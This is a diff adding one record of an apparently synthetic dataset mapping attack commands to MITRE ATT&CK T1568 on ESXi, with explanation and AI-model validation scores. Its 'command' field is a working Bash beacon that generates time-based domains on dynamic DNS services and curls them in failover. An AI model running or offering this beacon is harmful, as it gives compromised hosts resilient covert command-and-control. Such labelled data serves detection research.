@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "s=$(date -u +%s); h1=$(echo -n \"$s-1\" | sha256sum | cut -c1-12); h2=$(echo -n \"$s-2\" | sha256sum | cut -c1-12); h3=$(echo -n \"$s-3\" | sha256sum | cut -c1-12); port=$(( 20000 + ($s % 20000) )); d1=\"$h1.dynu.net\"; d2=\"$h2.duckdns.org\"; d3=\"$h3.ddns.net\"; curl --connect-timeout 3 \"https://$d1:$port/health\" || curl --connect-timeout 3 \"https://$d2:$port/health\" || curl --connect-timeout 3 \"https://$d3:$port/health\"",
+  "explanation": "Generates three time-based DGA candidates and attempts them in sequence, with a time-derived port, to leverage dynamic resolution and increase resiliency. This is characteristic of T1568.",
+  "rationale_steps": [
+    "Hash time-based seeds into multiple candidate subdomains.",
+    "Compute a port number from the epoch time.",
+    "Attempt curl to the first DGA domain; failover to others.",
+    "Rely on DNS resolution at runtime to avoid static indicators."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-950deaaf",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid Bash arithmetic and pipes, and correct use of curl flags and logical OR chaining.",
+        "semantic_score": 4,
+        "semantic_justification": "It deterministically generates time-based domain candidates and a time-derived port then attempts sequential HTTPS beacons, aligning with T1568 dynamic resolution, though practicality depends on ESXi having curl/sha256sum and the generated endpoints being resolvable.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T06:55:09.787288Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper semicolons as separators, valid arithmetic expansion, correct curl flags, and proper variable interpolation throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 by using time-seeded SHA256 hashing to generate three distinct DGA domain candidates across different DDNS providers (dynu.net, duckdns.org, ddns.net) with a time-derived rotating port, then attempting each in sequence for C2 resilience — fully consistent with dynamic resolution, endpoint rotation, and fallback beaconing behaviors described in the technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:25:58.087663Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed for a Bash environment, with correct variable assignments, subshells, arithmetic expansions, and logical operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately demonstrates a time-based DGA (Domain Generation Algorithm) by using the system clock to generate dynamic hostnames and ports across multiple Dynamic DNS providers, which is the core of MITRE ATT&CK T1568.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T00:26:01.948021Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
